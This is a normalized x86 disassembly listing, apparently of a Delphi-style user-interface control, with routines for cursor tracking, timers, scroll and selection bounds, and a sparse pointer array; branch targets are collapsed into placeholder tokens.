mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_434cd0
pop ebx
pop ebp
retn
sub_46928c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x280 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd0 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x27c ] ebx
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_463c5c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
push ebp
call sub_46921c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4691b0
push ebp
call sub_46921c
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x284 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x22c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x228 ]
mov eax [ ebp - 0x4 ]
call sub_4649fc
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_4644c0
sub_46936c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4693d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x280 ]
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4693d9
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
cmp [ ebx + 0x284 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x27c ]
call sub_46051c
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x284 ]
mov edx esi
mov eax ebx
mov si 0xffae
call sub_40348c
sub_4693e0
test [ eax + 0x249 ] 0x4
je r-xdata
call sub_4439d0
retn
mov cl [ edx + 0x4 ]
sub cl 0x8
je r-xdata
mov dl [ edx + 0x4 ]
call sub_464b2c
retn
add cl 0xe8
sub cl 0xe0
jae r-xdata
sub_469408
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_444968
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ax [ edi + 0x6 ]
sub ax 0x300
jne r-xdata
mov eax ebx
call sub_46936c
sub_46946c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4430b0
mov edx esp
mov eax ebx
call sub_468ca0
mov edx esp
mov eax ebx
call sub_466b90
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_444968
cmp eax [ esi + 0x4 ]
je r-xdata
mov eax ebx
call sub_4691b0
sub_4694e0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
lea edx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
call sub_4069fc
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_43dc90
mov eax [ esp ]
mov [ ebx + 0x274 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x278 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_469524
push ebx
push esi
push edi
push ebp
add esp 0xffffff90
mov edi edx
mov esi eax
xor ebx ebx
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov al [ esi + 0x28e ]
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_442f9c
push ebx
call SetCursor
jmp r-xdata
mov [ esp ] al
lea edx [ esp + 0x10 ]
mov eax esi
call sub_465bec
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx [ esi + 0x278 ]
mov edx [ esi + 0x274 ]
mov eax esi
mov ebp [ eax ]
call [ ebp + 0xcc ]
jmp r-xdata
add esp 0x70
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff1
call sub_45c0fc
mov ebx eax
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff2
call sub_45c0fc
mov ebx eax
sub_4695d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44309c
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
mov edx esp
mov eax ebx
call sub_468ca0
mov edx esp
mov eax ebx
call sub_466b90
mov eax ebx
call sub_46928c
mov eax edi
call sub_444968
cmp eax [ esi + 0x4 ]
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_46961c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_442f54
mov eax ebx
call sub_467b98
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_469674
push ebp
mov ebp esp
add esp 0xffffff98
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4696fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call KillTimer
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469704
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_465bec
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_4665e0
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_466720
push 0x1
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call KillTimer
jmp r-xdata
sub_46971c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_469674
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_469748
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_443ec4
pop esi
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_43e240
sub_469780
push ebx
push esi
mov ebx edx
mov esi eax
movsx ecx [ ebx + 0xa ]
movsx edx [ ebx + 0x8 ]
mov eax esi
call sub_464f14
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4697a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x249 ] 0x4
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0xd
jne r-xdata
mov [ esi + 0xc ] 0x1
sub_4697c8
add esp 0xffffffec
mov [ esp ] dl
mov edx [ eax + 0x210 ]
mov [ esp + 0xc ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x21c ]
dec edx
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x24c ]
dec edx
mov [ esp + 0x8 ] edx
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ eax + 0x238 ]
jle r-xdata
test [ esp ] 0x4
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0x4 ]
jge r-xdata
dec [ esp + 0xc ]
test [ esp ] 0x8
je r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ eax + 0x23c ]
jle r-xdata
inc [ esp + 0xc ]
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0xc ]
jne r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x8 ]
jge r-xdata
dec [ esp + 0x10 ]
lea edx [ esp + 0xc ]
call sub_4671d0
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x10 ]
je r-xdata
inc [ esp + 0x10 ]
add esp 0x14
retn
sub_46987c
push ebx
push esi
push edi
add esp 0xffffff88
mov edi eax
mov al [ edi + 0x28e ]
sub al 0x1
je r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x70 ]
mov edx esp
mov eax edi
call sub_43dc90
mov eax [ esp + 0x70 ]
mov [ esp ] eax
mov eax [ esp + 0x74 ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov eax edi
call sub_465bec
mov bl [ r-xdata ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax edi
call sub_465b90
mov al [ edi + 0x28e ]
dec al
je r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
sub al 0x3
je r-xdata
add esp 0x78
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_43db50
mov esi eax
sub esi [ esp + 0x24 ]
mov eax edi
call sub_43db50
sub eax [ esp + 0x14 ]
mov edx [ esp ]
cmp esi edx
jle r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x14 ]
jge r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x44 ]
push eax
push 0x1
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov eax edi
call sub_468ae8
jmp r-xdata
dec al
jne r-xdata
cmp eax edx
jge r-xdata
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x24 ]
jle r-xdata
or bl 0x1
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x14 ]
push eax
push 0x0
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov eax edi
call sub_468ae8
jmp r-xdata
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0x44 ]
jge r-xdata
or bl 0x1
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x54 ]
jle r-xdata
or bl 0x4
jmp r-xdata
mov al [ r-xdata ]
cmp al bl
je r-xdata
or bl 0x8
mov edx ebx
mov eax edi
mov si 0xffa6
call sub_40348c
sub_469a40
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
mov eax ebx
call sub_444c6c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x40
jne r-xdata
mov eax ebx
call sub_4553f0
test eax eax
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_469a7c
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_43eba4
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x24c ]
dec edx
mov eax [ ebx + 0x22c ]
cmp edx eax
jle r-xdata
mov al 0x1
mov edx eax
inc edx
mov eax ebx
call sub_46909c
sub_469ac8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_43ebf0
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x22c ]
cmp eax [ ebx + 0x23c ]
jle r-xdata
mov al 0x1
mov edx eax
dec edx
mov eax ebx
call sub_46909c
sub_469b94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_403fe0
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
sub_469bd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_403fe0
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_469c34
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
sub_469c64
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_469c90
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax ebx
call sub_43db50
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
call sub_43db50
mov esi eax
sub esi [ ebp - 0xc ]
mov [ ebp - 0xc ] esi
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] eax
xor edx edx
mov eax ebx
call sub_4660d8
mov dl 0x1
mov eax ebx
call sub_4660d8
sub_469d74
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx [ r-xdata ]
mov eax 0x8
call sub_404d88
mov ebx eax
mov [ ebx ] edi
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_404034
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_469f70
push ebx
push esi
push ecx
mov esi ecx
mov ebx edx
mov [ esp ] eax
movzx eax si
mov edx eax
shl edx 0x2
mov eax esp
call sub_4026fc
movzx edx si
movzx eax [ ebx ]
sub edx eax
shl edx 0x2
mov ecx [ esp ]
lea eax [ ecx + eax * 4 ]
xor ecx ecx
call sub_402cac
mov [ ebx ] si
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_469fac
push ebx
push esi
push edi
mov esi edx
shl esi 0x2
movzx edi si
mov eax edi
call sub_4026bc
mov ebx eax
mov edx edi
mov eax ebx
xor ecx ecx
call sub_402cac
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_469fd4
push ebx
push esi
test dl dl
je r-xdata
xor ebx ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] 0x0
mov [ eax + 0x10 ] 0xffffffff
xor ebx ebx
mov bl cl
movzx esi [ ebx + rw-data ]
inc esi
mov [ eax + 0x14 ] si
movzx esi [ ebx + rw-data ]
mov [ eax + 0xa ] si
xor ecx ecx
mov cl [ ebx + rw-data ]
mov [ eax + 0xc ] cx
mov [ eax + 0x18 ] 0xffffffff
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a038
push ebx
push esi
push edi
push ebp
call sub_40361c
mov ebx edx
mov esi eax
xor ebp ebp
mov di [ esi + 0x14 ]
shl edi 0x2
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp ebp eax
jl r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + ebp * 4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
inc ebp
movzx edx di
call sub_4026dc
test bl bl
jle r-xdata
movzx edx [ esi + 0x8 ]
shl edx 0x2
call sub_4026dc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_46a090
push ebx
cmp edx [ eax + 0x18 ]
jne r-xdata
mov cx [ eax + 0xc ]
mov ebx edx
shr ebx cl
mov ecx ebx
movzx ebx [ eax + 0x8 ]
cmp ecx ebx
jb r-xdata
mov ecx [ eax + 0x1c ]
jmp r-xdata
mov ebx [ eax + 0x4 ]
mov ecx [ ebx + ecx * 4 ]
test ecx ecx
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax ecx
pop ebx
retn
test ecx ecx
jne r-xdata
movzx ebx [ eax + 0xa ]
and ebx edx
shl ebx 0x2
add ecx ebx
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] ecx
sub_46a0dc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov cx [ ebx + 0xc ]
mov esi edi
shr esi cl
cmp si [ ebx + 0x8 ]
jb r-xdata
mov ebp [ ebx + 0x4 ]
lea ecx [ esi + 0x1 ]
lea edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_469f70
mov ebp eax
jmp r-xdata
movzx edx [ ebx + 0xa ]
and edx edi
shl edx 0x2
add eax edx
cmp edi [ ebx + 0x10 ]
jle r-xdata
movzx eax si
mov dx [ ebx + 0x14 ]
call sub_469fac
movzx edx si
mov [ ebp + edx * 4 ] eax
mov [ ebx + 0x4 ] ebp
movzx eax si
mov eax [ ebp + eax * 4 ]
test eax eax
jne r-xdata
mov [ ebx + 0x18 ] 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edi
sub_46a148
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_46a0dc
mov [ eax ] esi
test esi esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_46a090
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_46a230
sub_46a17c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp eax [ ebp - 0x18 ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x18 ]
mov ebx [ eax + edx * 4 ]
test ebx ebx
je r-xdata
inc [ ebp - 0x18 ]
xor edi edi
mov cx [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
shl eax cl
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx eax [ esi + 0x14 ]
cmp edi eax
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
add ebx 0x4
inc edi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x14 ] eax
sub_46a208
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp eax [ ecx + 0x10 ]
jle r-xdata
xor ecx ecx
test edx edx
je r-xdata
mov ecx 0x1
jmp r-xdata
mov eax ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
sub_46a230
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0xffffffff
mov edx sub_46a208
mov eax [ ebp - 0x4 ]
call sub_46a17c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x10 ] edx
pop ecx
pop ecx
pop ebp
retn
sub_46a25c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
call sub_46a4b4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a294
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_46a2bc
push ebx
mov ebx eax
mov dl 0x1
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov dl [ ebx + 0xc ]
mov eax ebx
call sub_46a4b4
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
sub_46a2dc
push ebx
push esi
push edi
push ebp
mov ebx eax
test edx edx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edx [ ebx + 0x8 ]
jge r-xdata
mov esi edx
mov edi [ ebx + 0x8 ]
dec edi
sub edi esi
jl r-xdata
xor ecx ecx
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_46a148
dec [ ebx + 0x8 ]
inc edi
lea edx [ esi + 0x1 ]
mov ebp [ ebx + 0x4 ]
mov eax ebp
call sub_46a090
mov ecx eax
mov edx esi
mov eax ebp
call sub_46a148
inc esi
dec edi
jne r-xdata
sub_46a328
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46a370
mov ebp eax
mov edx edi
mov eax ebx
call sub_46a370
mov ecx eax
mov edx esi
mov eax ebx
call sub_46a4d4
mov ecx ebp
mov edx edi
mov eax ebx
call sub_46a4d4
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46a370
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push j_sub_4039e4#9
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_46a090
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a3d2
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov edx [ ebp - 0x4 ]
mov ecx ebx
mov eax [ r-xdata ]
call sub_4139c8
sub_46a3dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46a470
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jge r-xdata
mov ebx [ esi + 0x8 ]
cmp edi ebx
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax [ r-xdata ]
call sub_4139c8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4 ]
call sub_46a148
cmp edi [ esi + 0x8 ]
jle r-xdata
mov edx ebx
dec edx
mov eax [ esi + 0x4 ]
call sub_46a090
mov ecx eax
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_46a148
dec ebx
cmp edi ebx
jl r-xdata
inc [ esi + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a477
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov [ esi + 0x8 ] edi
sub_46a480
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46a370
mov ebp eax
mov edx esi
mov eax ebx
call sub_46a2dc
mov ecx ebp
mov edx edi
mov eax ebx
call sub_46a3dc
sub_46a4b4
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0xc ] bl
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_469fd4
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_46a4d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039e4#8
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jge r-xdata
mov ecx edi
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_46a148
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
inc eax
mov [ ebx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a543
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4139c8
sub_46a54c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a25c
mov [ esi + 0x10 ] eax
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a5a0
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x10 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_46a5d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a63b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41780c
mov esi eax
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a642
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
push 0x0
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41855c
mov eax [ ebp - 0x8 ]
push eax
mov eax ebx
call sub_41780c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x64 ]
dec esi
test esi esi
jg r-xdata
sub_46a65c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
xchg edx eax
call sub_419094
mov edx [ ebx + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4191b0
xor eax eax
pop ebx
pop ebp
retn
sub_46a684
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx sub_46a64c
mov eax [ ebx + 0x10 ]
call sub_46a364
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419094
mov edx sub_46a65c
mov eax [ ebx + 0x10 ]
